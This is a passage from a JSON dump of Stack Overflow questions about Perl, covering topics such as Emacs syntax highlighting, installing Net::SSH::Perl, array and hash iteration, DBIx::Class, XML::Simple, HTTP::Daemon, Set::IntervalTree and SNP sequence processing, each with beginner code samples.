pretty well.</p>\n\n<p>Then I learned the magic C-u C-x = key combination, which shows, among other stuff, the text properties for the text under the cursor, hoping to make a better coloring scheme of my own. At this point it started making even less sense.</p>\n\n<p>\"print\" has <i>cperl-nonoverridable-face</i>. \"die\" has <i>font-lock-keyword-face</i>. Meanwhile, both are functions and can be (and often are) overrided. \"system\" has <i>font-lock-type-face</i>. Why? Function declarations have <i>font-lock-function-name-face</i> - that's OK, but so do the arguments of \"use\". Why? Function calls and scalars don't have face property at all and can't be highlighted. Why? Etc, Etc. Again, I could keep going.</p>\n\n<p>Is there a way to fix all that? Is there some config where I can remap lexical units to some other font-faces, or some other way to make the syntax highlight less crazy?</p>\n\n<p>To avoid the \"perl is unparsible\" talk, here's a screenshot of the editor I'm migrating from, with the very same code: <a href=\"http://breqwas.net/dropbox/perlsyn_pn.png\" rel=\"nofollow\">http://breqwas.net/dropbox/perlsyn_pn.png</a>. Looks much more reasonable. </p>\n"},{"tags":["perl","ssh","perl-module","net-ssh"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":4765,"score":2,"question_id":5939696,"title":"installing Net/SSH/Perl.pm","body":"<p>I am fairly new to scripting with perl. I am trying to ssh into a server and perform some commands. I have to provide a username and password.</p>\n\n<p>When trying to run the script that i have so far (code listed below). I get the following error.</p>\n\n<p>I am assuming this means that i need to install/make Net/SSH/Perl.pm, however, when i follow the instructions and tutorials i have found online, none have worked.</p>\n\n<p>Can someone please assist me. I have tried <code>CPAN</code> and <code>ppm</code>, <code>CPAN</code> says it cannot find <code>net::ssh::perl</code> or other variations of that string. And <code>ppm</code> will not even run, i do not see it in my perl directory. Any help is greatly appreciated!</p>\n\n<hr>\n\n<pre><code>// The code\n#!/usr/bin/perl\nuse Net::SSH::Perl;\n\n$uName = \"username\";\n$pWord = \"password\";\n\n$unitIp = $ARGV[0];\n\nmy $ssh = Net::SSH::Perl-&gt;new($unitIp, 35903);\n$ssh-&gt;login($uName, $pWord);\nmy $out = $ssh-&gt;cmd(\"java -version\");\nprint $out;\n</code></pre>\n\n<hr>\n\n<pre><code>// the error that is returned\nCan't locate Net/SSH/Perl.pm in @INC (@INC contains: /usr/lib/perl5/5.8.5/i386-linux-thread-multi /usr/lib/perl5/5.8.5 /usr/lib/perl5/site_perl/5.8.5/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.4/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.3/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.2/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.1/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.0/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.5 /usr/lib/perl5/site_perl/5.8.4 /usr/lib/perl5/site_perl/5.8.3 /usr/lib/perl5/site_perl/5.8.2 /usr/lib/perl5/site_perl/5.8.1 /usr/lib/perl5/site_perl/5.8.0 /usr/lib/perl5/site_perl /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.4/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.3/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.2/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.1/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.0/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.5 /usr/lib/perl5/vendor_perl/5.8.4 /usr/lib/perl5/vendor_perl/5.8.3 /usr/lib/perl5/vendor_perl/5.8.2 /usr/lib/perl5/vendor_perl/5.8.1 /usr/lib/perl5/vendor_perl/5.8.0 /usr/lib/perl5/vendor_perl .) at needsAName.pl line 31.\nBEGIN failed--compilation aborted at needsAName.pl line 31.\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":13140498,"title":"What is the most efficient method to iterate over a Perl array?","body":"<p>I am reading an ordered file for which I must count by-hour, by-minute or by-second occurrences. If requested, I must print times with 0 occurrences (normalized output) or skip them (non-normalized output). The output must obviously be ordered.</p>\n\n<p>I first thought using an array. When the output is non normalized, I am doing roughly the equivalent of:</p>\n\n<pre><code>@array[10] = 100;\n@array[10000] = 10000;\n</code></pre>\n\n<p>And to print the result:</p>\n\n<pre><code>foreach (@array) {\n  print if defined;\n}\n</code></pre>\n\n<p>Is there a way to reduce iterations to only elements defined in the array? In the previous example, that would mean doing only two iterations, instead of 10000 as using <code>$#array</code> implies. Then I would also need a way to know the current array index in a loop. Does such a thing exist? </p>\n\n<p>I am thinking more and more to use a hash instead. Using a hash solves my problem and also eliminates the need to convert hh:mm:ss times to index and vice-versa.</p>\n\n<p>Or do you have a better solution to suggest for this simple problem?</p>\n"},{"tags":["perl","global","catalyst","subroutine"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":11941836,"title":"catalyst global subroutines","body":"<p>In my Catalyst app that I am building I have several subroutines that do essentially the same thing, but they are all in different parts of the app. Is there a central place in Catalyst where I can call the subroutines from anywhere in the app? I'd like to avoid repeating code. Thanks!</p>\n"},{"tags":["perl","large-files"],"answer_count":11,"favorite_count":2,"up_vote_count":5,"down_vote_count":2,"view_count":11998,"score":3,"question_id":303053,"title":"How can I read lines from the end of file in Perl?","body":"<p>I am working on a Perl script to read CSV file and do some calculations.\nCSV file has only two columns, something like below.</p>\n\n<pre><code>One Two\n1.00 44.000\n3.00 55.000\n</code></pre>\n\n<p>Now this CSV file is very big ,can be from 10 MB to 2GB.</p>\n\n<p>Currently I am taking CSV file of size  700 MB. I tried to open this file in notepad, excel but it looks like no software is going to open it.</p>\n\n<p>I want to read may be last 1000 lines from CSV file and see the values.\nHow can I do that? I cannot open file in notepad or any other program.</p>\n\n<p>If I write a Perl script then I need to process complete file to go to end of file and then read last 1000 lines.</p>\n\n<p>Is there any better way to that? I am new to Perl and any suggestions will be appreciated. </p>\n\n<p>I have searched net and there are some scripts available like File::Tail but I don't know they will work on windows ?</p>\n"},{"tags":["perl","multidimensional-array"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":13133802,"title":"finding multidimensional array size","body":"<p>What is the difference when you use () in perl versus [] for example and how do you find the size of the array when it uses the square brackets?</p>\n\n<pre><code>my @myarr = ( # parenthesis\n                [ \"itemone\", \"itemoneb\", \"itemonec\" ],\n                [ \"itemtwo\", \"itemtwob\", \"itemtwoc\" ]\n               );\n\nmy @myarr = [ # square bracket\n                [ \"itemone\", \"itemoneb\", \"itemonec\" ],\n                [ \"itemtwo\", \"itemtwob\", \"itemtwoc\" ]\n               ];\n</code></pre>\n\n<p><strong>EDIT</strong>\nThank you for the explanations I am still trying to understand this it's just slightly confusing to me at the moment. I still can't figure out how to iterate through my data here</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\nuse FindBin qw($Bin);\nuse Cwd;\nuse Data::Dumper;\n\nmy @mynames = (\n                [ \"myname\", \"mydescription\", \"mydata\"],\n                [ \"myname2\", \"mydescription2\", \"mydata2\"],\n                [ \"myname3\", \"mydescription3\", \"mydata3\"],\n               );\n\n\ngo();\n\nsub go {\n    start(\\@mynames);\n}\n\nsub start {\n    my @input_name = shift;\n\n    # This works\n    #print @input_name-&gt;[0][0][0];\n    #die;\n\n    # This Shows\n    #print Dumper(@input_name);\n    #$VAR1 = [\n    #          [\n    #            'myname',\n    #            'mydescription',\n    #            'mydata'\n    #          ],\n    #          [\n    #            'myname2',\n    #            'mydescription2',\n    #            'mydata2'\n    #          ],\n    #          [\n    #            'myname3',\n    #            'mydescription3',\n    #            'mydata3'\n    #          ]\n    #        ];\n\n    # How do I iterate?\n    #for my $i (0..@$input_name) {\n    #    my $name = \"\";\n    #    my $description = \"\";\n    #    my $data = \"\";\n    #    \n    #}\n}\n</code></pre>\n"},{"tags":["perl","schema","catalyst","dbix-class"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12047855,"title":"dbix::class generate schema for a non-catalyst app","body":"<p>I've been building Catalyst apps lately and one thing I love is using Catalyst's create script to easily generate the table schemas for <a href=\"https://metacpan.org/module/DBIx::Class\" rel=\"nofollow\">DBIx::Class</a>. I'd like to be able to use DBIX::Class without having to write the schemas for my tables manually. Is there a way to do this without doing it by hand? Thanks!</p>\n"},{"tags":["perl","rrdtool"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13135567,"title":"How to fetch value from different RRA in rrdfile","body":"<p>I created an RRD file using \nRRA:AVERAGE:0.5:30:1350370680 for 7 month.it takes data at every 10 second having following Data Source.\nusing perl script i added aniother RRA in existing file</p>\n\n<pre><code>   #!/usr/bin/perl\n   use strict;\n   use RRD::Editor();\n   my $rrd = RRD::Editor-&gt;new();\n   $rrd-&gt;open(\"172_16_32_2_Ethe1_0_1.rrd\");\n   print $rrd-&gt;info();\n   $rrd-&gt;add_RRA(\"RRA:AVERAGE:0.5:360:5040\");\n   $rrd-&gt;save(\"172_16_32_2_Ethe1_0_1.rrd\");\n</code></pre>\n\n<p>Now i want to fetch data according to new RRA.\ncan Anyone help me\nThanx in advance</p>\n"},{"tags":["perl","sed","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":54,"score":3,"question_id":13124610,"title":"Modify Sequence with snp position and output in same file","body":"<p>i have two files one with positions information and another is sequence information. Now i need to read the positions and take the snps at the positions and replace that position base with the snp information in the sequence and write it in the snp information file.. for example</p>\n\n<p>Snp file contains </p>\n\n<pre><code>10 A C A/C\n</code></pre>\n\n<p>Sequence file contains </p>\n\n<pre><code>ATCGAACTCTACATTAC\n</code></pre>\n\n<p>Here 10th element is T so i will replace T with [A/C] so the final output should be </p>\n\n<pre><code>10 A C A/C ATCGAACTC[A/C]ACATTAC\n</code></pre>\n\n<p>Example files are </p>\n\n<p>Snp file</p>\n\n<pre><code>SNP Ref Alt\n10  A   C\n19  G   C\n30  C   T\n42  A   G\n</code></pre>\n\n<p>Sequence :</p>\n\n<blockquote>\n  <p>sequence1\n  CTAGAATCAAAGCAAGAATACACTCTTTTTTTTGGAAAAGAATATCTCATGTTTGCTCTT</p>\n</blockquote>\n\n<p>Final output :</p>\n\n<pre><code>SNP Ref Alt Output\n10  A   C   CTAGAATCA[A/C]AGCAAGAANACACTCTTTTTTTTGGAAAAGAATATCTCATGTTTGCTCTT\n19  G   C   CTAGAATCANAGCAAGAA[C/G]ACACTCTTTTTTTTGGAAAAGAATATCTCATGTTTGCTCTT\n30  C   T   CTAGAATCAAAGCAAGAATACACTCTTTT[T/C]TTTGGAAAAGAATATCTCATGTTTGCTCTT\n42  A   G   CTAGAATCAAAGCAAGAATACACTCTTTTTTTTGGAAAAGA[A/G]TATCTCATGTTTGCTCTT\n</code></pre>\n\n<p>While replacing the snps here from Ref and Alt column, we need to consider the order of {A,T,C,G} like the [Ref/Alt] always the first base should be either A or T or C and followed by that order.</p>\n\n<p>Another thing is if we take the snp position, and if there are any snps in 10 bases difference, we need to replace that snp position with \"N\".  In the above example in first two positions as the difference is 9 we are replacing the other element with 'N'. </p>\n\n<p>I have written code where it prints the positions in order and also replaces the sequence with that snp position but unable to read nearby positions and replace with N.</p>\n\n<p>My approach might be completely wrong as i am beginner in coding.. I think by using hashes, we might achieve this easily but i am not so familiar with hashes..help with some suggestions please.. i dont have to stick with only perl, </p>\n\n<pre><code>my $input_file = $ARGV[0];\nmy $snp_file = $ARGV[1];\nmy $output_file = $ARGV[2];\n\n%sequence_hash = ();\n\nopen SNP, $snp_file || die $!;\n$indel_count = 0;\n$snp_count = 0;\n$total_count = 0;\n\n#### hashes and array\n@id_array = ();\n\nwhile ($line = &lt;SNP&gt;) {\n\n    next if $line =~ /^No/;\n    $line =~ s/\\r|\\n//g;\n\n\n   # if ($line =~ /\\tINDEL/) {\n\n    #    $indel_count++;\n     #   $snp_type = \"INDEL\";\n\n    #} else {\n     #   $snp_count++;\n      #  $snp_type = \"SNP\";\n    #}\n\n    @parts = split(/\\t/,$line);\n\n    $id = $parts[0];\n    $pos = $parts[1];\n    #$ref_base = $parts[3];\n    @temp_ref = split(\",\",$parts[2]);\n    $ref_base = $temp_ref[0];\n    @alt = split(\",\",$parts[3]);\n    $alt_base = $alt[0];\n    $snpformat = '';\n\n    if ($ref_base eq \"A\" || $alt_base eq \"A\")\n    {\n\n        if ($ref_base eq \"A\"){\n            $snpformat = \"[\".join(\"/\",$ref_base,$alt_base).\"]\";}\n            #$snpformat = $ref_base/$alt_base;}\n            #print \"refbase is A $ref_base \\t $alt_base \\t $snpformat \\n\"; }\n\n            else \n            {$snpformat = \"[\".join(\"/\",$alt_base,$ref_base).\"]\";}\n            #print \"Altbase is A $ref_base \\t $alt_base \\t $snpformat \\n\";}\n    }\n\n    elsif ($ref_base eq \"T\" || $alt_base eq \"T\")\n    {\n\n        if ($ref_base eq \"T\"){\n            $snpformat = \"[\".join(\"/\",$ref_base,$alt_base).\"]\";}\n            #$snpformat = $ref_base/$alt_base;}\n            #print \"refbase is A $ref_base \\t $alt_base \\t $snpformat \\n\"; }\n\n            else \n            {$snpformat = \"[\".join(\"/\",$alt_base,$ref_base).\"]\";}\n            #print \"Altbase is A $ref_base \\t $alt_base \\t $snpformat \\n\";}\n    }\n\n    elsif ($ref_base eq \"C\" || $alt_base eq \"C\")\n    {\n\n        if ($ref_base eq \"C\"){\n            $snpformat = \"[\".join(\"/\",$ref_base,$alt_base).\"]\";}\n            #$snpformat = $ref_base/$alt_base;}\n            #print \"refbase is A $ref_base \\t $alt_base \\t $snpformat \\n\"; }\n\n            else \n            {$snpformat = \"[\".join(\"/\",$alt_base,$ref_base).\"]\";}\n            #print \"Altbase is A $ref_base \\t $alt_base \\t $snpformat \\n\";}\n    }\n\n\n    else \n    {$snpformat = \"-/-\" ;}\n    print \" $id \\t $pos \\t $ref_base \\t $alt_base \\t $snpformat \\n  \";\n}\n\nopen SEQ, $input_file ||die $!;\n\n$header = '';\n$sequence = '';\n$num_sequences = 0;\n\nwhile ($line = &lt;SEQ&gt;) {\n\n    $line =~ s/\\r|\\n//g;\n    next if $line =~ //;\n\n    if ($line =~ /^&gt;(.+)/) {\n        if ($header eq '') {\n\n            $header = $1;\n            $sequence = '';\n            next;\n        } else {\n\n            $sequence_len = length($sequence);\n\n            $sequence_hash{$header} = $sequence;\n            push (@headers,$header);\n            #print $header.\"\\t\".$sequence_len.\"\\n\";\n            #print $sequence.\"\\n\";\n            $num_sequences++;\n\n            $header = $1;\n            $sequence = '';\n\n        }\n\n\n    } else {\n\n        $sequence .= $line;\n\n    }\n\n}\n$sequence_len = length($sequence);\n$sequence_hash{$header} = $sequence;\npush (@headers,$header);\n#print $header.\"\\t\".$sequence_len.\"\\n\";\n\n$num_sequences++;\n\nclose (SEQ);\n\n$pos = '4';\nsubstr($sequence,$pos,1) = \"[A/G]\";\nprint $sequence.\"\\n\";   \nprint \"$pos \\n\";\n</code></pre>\n"},{"tags":["sql","perl","oracle","parsing","lexical-analysis"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13132696,"title":"Parse Oracle Query using perl","body":"<p>I have to perform lexical analysis on the oracle query and separate the query to various parts (based on the clauses)in perl. For example,Consider : </p>\n\n<pre><code>Select deleteddate,deletedby from temptable where id = 10;\n</code></pre>\n\n<p>I need to print </p>\n\n<pre><code>select : deleteddate , deletedby\nfrom : temptable\nwhere : id = 10\n</code></pre>\n\n<p>I used this code snippet : </p>\n\n<pre><code>my $parser= SQL::Statement-&gt;new();\n$parser-&gt;{PrinteError}=1;\nmy $query = SQL::Statement-&gt;new(\"select deleteddate,deletedby from temptable where id =10\",$parser);\n\nmy @columns = $query-&gt;columns();\n\nprint $columns[0]-&gt;name();\n</code></pre>\n\n<p>Though this prints deleteddate, this fails when i give a subquery inside the select clause:</p>\n\n<pre><code>Select deleteddate,deletedby,(select 1+1 from dual) from temptable where id = 10;\n</code></pre>\n\n<p>Can you please point me in the correct direction.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","build-process"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":27,"score":-2,"question_id":13133967,"title":"Building Perl -This GNU configure front end does not understand --param","body":"<p>This GNU configure front end does not understand --param</p>\n"},{"tags":["perl","winapi","fork","http-daemon"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13132438,"title":"HTTP::Daemon crashing when I stop the loop","body":"<p>I'm working on an adhoc GUI so that I can easily view a bunch of data from the VMWare Perl SDK without having to setup a bunch of scripts under IIS.  The basic idea is to start up the script, and have it fork two processes.  One is the HTTP::Daemon web server, and then two seconds later its the Win32::IEAutomation run browser.  It's not pretty, I admit, but I'm slightly comfortable with the VMPerlSDK than the VMCOMSDK.  Plus I'm kind of curious to see if I can get this to work.</p>\n\n<p>As far as I can tell, the program starts okay.  The fork works.  The little URI parser works.  The only problem is whenever I try to call /quit to shutdown the server, the script explodes.</p>\n\n<p>Any suggestions (aside from how this should be done with IIS and AutoIT, I know, I know) would be appreciated.  Thanks!</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse Data::Dumper;\nuse HTTP::Daemon;\nuse HTTP::Status;\nuse HTTP::Response;\nuse strict;\nuse warnings;\nuse Win32::IEAutomation;\n\nsub MainPage {\n    return&lt;&lt;eol\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;h3&gt;Home&lt;/h3&gt;\n&lt;p&gt;&lt;a href=\"/quit\"&gt;Quit&lt;/a&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\neol\n}\n\n# Parses out web variables\nsub WebParse {\n    my ($wstring) = @_;\n    my %webs = ();\n    # gets key/value data\n    my @pairs = split(/&amp;/, $wstring);\n\n    # puts the key name into an array\n    foreach my $pair (@pairs) {\n            my ($kname, $kval) = split (/=/, $pair);\n            $kval =~ tr/+/ /;\n            $kval =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;\n            $webs{$kname} = $kval;\n    }\n\n    return(%webs);\n}\n\nsub StartServer {\n    my $PORT = shift;\n    my $ALLOWED = shift;\n\n    my $d = HTTP::Daemon-&gt;new(ReuseAddr =&gt; 1, LocalAddr =&gt; $ALLOWED, LocalPort =&gt; $PORT) || die;\n\n    # Prints a startup message\n    print \"Please contact me at: &lt;URL:\", $d-&gt;url, \"&gt;\\n\";\n    my $xt = 0;\n\n    BLOOP: while (my $c = $d-&gt;accept) {\n        while (my $r = $c-&gt;get_request) {\n            # Handles requests with the GET or POST methods\n            if ($r-&gt;method =~ m/GET/i || $r-&gt;method =~ m/POST/i) {\n                my $uri = $r-&gt;uri; my %ENV = ();\n\n                $ENV{REQUEST_METHOD} = $r-&gt;method;\n                $ENV{CONTENT_TYPE}   = join('; ', $r-&gt;content_type);\n                $ENV{CONTENT_LENGTH} = $r-&gt;content_length || '';\n                $ENV{SCRIPT_NAME}    = $uri-&gt;path || 1;\n                $ENV{REMOTE_ADDR}    = $c-&gt;peerhost();\n\n                if ($r-&gt;method =~ m/GET/i) {\n                    $ENV{QUERY_STRING}   = $uri-&gt;query || '';\n                }\n                elsif ($r-&gt;method =~ m/POST/i) {\n                    $ENV{QUERY_STRING}   = $r-&gt;{\"_content\"} || '';\n                }\n\n                my %q = &amp;WebParse($ENV{QUERY_STRING});\n\n                my $res = HTTP::Response-&gt;new(\"200\");\n\n                if ($uri =~ m/quit/i) {\n                    $res-&gt;content(\"Goodbye\");\n                    $xt=1;\n                }\n                else {\n                    $res-&gt;content(MainPage());\n                }\n\n                $c-&gt;send_response($res);\n            }\n            # Otherwise\n            else {\n                $c-&gt;send_error(\"This server only accepts GET or POST methods\");\n            }\n\n            if ($xt == 1) {\n                sleep(2);\n                $c-&gt;force_last_request();\n                last BLOOP;\n            }\n\n            $c-&gt;close;\n        }\n        undef($c);\n    }\n    $d-&gt;close;\n    undef($d);\n    exit;\n}\n\nsub StartInterface {\n    my $PORT = shift;\n    my $ALLOWED = shift;\n    my $ie = Win32::IEAutomation-&gt;new(visible =&gt; 1, maximize =&gt; 1);\n    $ie-&gt;gotoURL(\"http://\".$ALLOWED.\":\".$PORT.\"/\");\n    exit;\n}\n\n# Return Status\nmy $STATUS = 1;\n\n# Server port number\nmy $PORT = 9005;\n\n# The server that's allowed to talk to this one\nmy $ALLOWED = \"127.0.0.1\";\n\nmy $pid = fork();\n\nif ($pid == 0) {\n    StartServer($PORT, $ALLOWED);\n} else {\n    sleep(2);\n    StartInterface($PORT, $ALLOWED);\n}\n\nexit;\n</code></pre>\n"},{"tags":["perl","apache2","plack"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13132042,"title":"How do I get my Poet web site running under Apache2?","body":"<p>If I currently have a Poet web site running under the standalone plackup server (via run.pl), how do I configure Apache2 to host this Poet web site?</p>\n\n<p>Searches for \"+apache2 +poet\" retrieve plenty of results about poets using Apache2 (to publish their poetry), and articles such as \"Mason 2 will work with Apache/mod_perl 1.\" Then there are documents such as <a href=\"http://search.cpan.org/~miyagawa/PSGI-1.101/PSGI/FAQ.pod\" rel=\"nofollow\">http://search.cpan.org/~miyagawa/PSGI-1.101/PSGI/FAQ.pod</a> which tell me âIn Plack, we already support most web servers like Apache2â without giving any of the details of how such support is provided.</p>\n\n<p>What is the minimal Apache2 config file I need in order to get my existing Poet web site running under Apache?</p>\n\n<p>Here is my existing project layout:</p>\n\n<pre><code>/Users/me/Documents/Ponies/poet\n    bin\n        run.pl\n    comps\n        index.mc\n    conf\n    data\n    db\n    lib\n    logs\n    static\n    t\n</code></pre>\n\n<p>Here is my starting httpd.conf file:</p>\n\n<pre><code>LoadModule log_config_module /opt/local/apache2/modules/mod_log_config.so\n\nListen 5000\nServerRoot /Users/me/Documents/Ponies/poet\nLogFormat \"%{X-Forwarded-For}i %l %u %t \\\"%r\\\" %&gt;s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\" combined\nCustomLog logs/access.log combined\nErrorlog logs/error.log\nPidFile httpd.pid\nLockFile accept.lock\nUser  me\nGroup staff\n\n&lt;VirtualHost *:5000&gt;\nServerName foo.local\nDocumentRoot /Users/me/Documents/Ponies/poet/\nAddHandler cgi-script .cgi .pl .py\n&lt;Directory \"/Users/me/Documents/Ponies/poet\"&gt;\nOptions +ExecCGI\n&lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>Links to appropriate documentation would be appreciated, as long as there is some indication of what part of the Poet web site I need to point to in order to get a URL such as <a href=\"http://foo.local/ponies/\" rel=\"nofollow\">http://foo.local/ponies/</a> to produce the content generated by <code>â¦/Ponies/poet/comps/index.mc</code>.</p>\n"},{"tags":["perl","unix","sed","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":95,"score":2,"question_id":13131686,"title":"check if a number lies in between two values","body":"<p>I have this file</p>\n\n<pre><code>427 A   C   A/C 12\n436 G   C   G/C 12\n445 C   T   C/T 12\n447 A   G   A/G 9\n451 T   C   T/C 5\n456 A   G   A/G 12\n493 G   A   G/A 12\n</code></pre>\n\n<p>I wanted to read the first column and find all other ids which are differences less than 10.</p>\n\n<pre><code>427 A   C   A/C 12  436\n436 G   C   G/C 12  427,445\n445 C   T   C/T 12  436,447,451\n447 A   G   A/G 9   445,451,456\n451 T   C   T/C 5   445,447,456\n456 A   G   A/G 12  451,447\n493 G   A   G/A 12\n</code></pre>\n\n<p>The last column should be like the above. All id's which are + or - 10 bases apart from that specific id. For example for 436, the boundaries are {426 - 446} other id's which are in that range are 427 and 445 so i displayed them in 6th column..</p>\n"},{"tags":["xml","perl"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":87,"score":3,"question_id":13118744,"title":"Input XML data doen't match with the output XML format","body":"<p><strong>Input XML</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!--00/00/0000 12:35:25 AM--&gt;\n&lt;Physical xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" &gt;\n  &lt;Pro managementID=\"22000020\"&gt;\n    &lt;Identification Type=\"XXXXX\" &gt;          \n      &lt;Address&gt;\n        &lt;Data&gt;test&lt;/Data&gt;        \n      &lt;/Address&gt;\n      &lt;Phone&gt;\n        &lt;Number&gt;0000&lt;/Number&gt;\n      &lt;/Phone&gt;\n      &lt;Email&gt;test@com&lt;/Email&gt;\n    &lt;/Identification&gt;       \n  &lt;/Pro&gt;\n&lt;/Physical&gt;\n</code></pre>\n\n<p>Script:</p>\n\n<p>I am trying to change the value of the tag and print the rest to a new output xml file</p>\n\n<pre><code>use strict;\nuse warnings;\nuse XML::Simple;\nuse Data::Dumper;     \n\n  my $xml = XML::Simple-&gt;new(ForceContent =&gt; 1,);\n  my $xmlData = $xml-&gt;XMLin('input.xml') or die$!;     \n\n  print Dumper (\\$xmlData);\n\n  foreach my $xmlKey ( keys %{$xmlData} ){\n   if ( $xmlKey =~ m/Pro/){\n       print ${$xmlData}{$xmlKey}{Identification}{Address}{Data}=\"hello\";\n    }\n  }\n\nXMLout(\n    $xmlData,\n    KeepRoot =&gt; 1,\n    NoAttr =&gt; 0,\n    OutputFile =&gt; $xml_out,\n);\n</code></pre>\n\n<p><strong>Outout XML:</strong></p>\n\n<pre><code>&lt;opt xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n  &lt;Pro managementID=\"22000020\"&gt;\n     &lt;Identification Type=\"XXXXX\"&gt;\n      &lt;Address Data=\"hello\" /&gt;\n      &lt;Email&gt;test@com&lt;/Email&gt;\n      &lt;Phone name=\"Number\"&gt;0000&lt;/Phone&gt;\n    &lt;/Identification&gt;\n  &lt;/Pro&gt;\n&lt;/opt&gt;\n</code></pre>\n\n<p>I am able to change the value, but whem i am trying to write the data to the ouput the format has been changed.Can any one guide me to get the same input data with changed value as output.</p>\n"},{"tags":["perl","interval-tree"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13130109,"title":"Set::IntervalTree acting weirdly when I add nodes through a loop in perl","body":"<p>I am trying to use the <a href=\"https://metacpan.org/module/Set%3a%3aIntervalTree\" rel=\"nofollow\"><code>Set::IntervalTree</code></a> module and I think it is giving me the same node pointers if I insert the elements in a loop.</p>\n\n<p>If I insert them outside a loop sequentially one after the another the nodes are inserted fine and the <code>find</code> / <code>find_window</code> calls works perfectly. But on the nodes which were added in the loop, the find functions give strange results.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse Set::IntervalTree;\nmy $tree = Set::IntervalTree-&gt;new;\n\n$tree-&gt;insert(\"60:70\", 60, 70);\n$tree-&gt;insert(\"70:80\", 70, 80);\n$tree-&gt;insert(\"80:90\", 80, 90);\n\nfor(my $i = 0; $i &lt; 60; $i=$i+10)\n{\n    $j = $i+10;\n    print \"$i\".\":\".\"$j\\n\";\n    $tree-&gt;insert(\"$i\".\":\".\"$j\", $i, $i+10);\n}\n\nprint $tree-&gt;str;\n\nmy $results1 = $tree-&gt;fetch(25, 28);\nmy $window = $tree-&gt;fetch_window(25,250);\nmy @arr1 = @$results1;\nprint \" @arr1 found.\\n\";\n\nmy $results2 = $tree-&gt;fetch(65, 68);\nmy @arr2 = @$results2;\nprint \" @arr2 found.\\n\";\n</code></pre>\n\n<p>This is the output. Check the node pointers.. the ones added from the loop have same pointers and they return wrong interval (which i guess is due to the same pointer values.)</p>\n\n<pre><code>Node:0x9905b20, k=0, h=9, mH=9  l-&gt;key=NULL  r-&gt;key=NULL  p-&gt;key=10  color=BLACK\nNode:0x9905b20, k=10, h=19, mH=29  l-&gt;key=0  r-&gt;key=20  p-&gt;key=30  color=RED\nNode:0x9905b20, k=20, h=29, mH=29  l-&gt;key=NULL  r-&gt;key=NULL  p-&gt;key=10  color=BLACK\nNode:0x9905b20, k=30, h=39, mH=89  l-&gt;key=10  r-&gt;key=70  p-&gt;key=NULL  color=BLACK\nNode:0x9905b20, k=40, h=49, mH=49  l-&gt;key=NULL  r-&gt;key=NULL  p-&gt;key=50  color=RED\nNode:0x9905b20, k=50, h=59, mH=69  l-&gt;key=40  r-&gt;key=60  p-&gt;key=70  color=BLACK\nNode:0x98c6270, k=60, h=69, mH=69  l-&gt;key=NULL  r-&gt;key=NULL  p-&gt;key=50  color=RED\nNode:0x98fd138, k=70, h=79, mH=89  l-&gt;key=50  r-&gt;key=80  p-&gt;key=30  color=RED\nNode:0x98fd078, k=80, h=89, mH=89  l-&gt;key=NULL  r-&gt;key=NULL  p-&gt;key=70  color=BLACK\n\n 50:60 found.\n 60:70 found.\n</code></pre>\n"},{"tags":["perl","mongodb"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":76,"score":4,"question_id":13124876,"title":"Compilation errors when connecting to MongoDB from Perl","body":"<p>I'm trying to run the simple \"MongoDB:Tutorial\" tutorial:</p>\n\n<p><a href=\"http://search.cpan.org/dist/MongoDB/lib/MongoDB/Tutorial.pod\" rel=\"nofollow\">http://search.cpan.org/dist/MongoDB/lib/MongoDB/Tutorial.pod</a></p>\n\n<p>My goal is to connect to a MongoDB database from a Perl script. I've installed MongoDB using 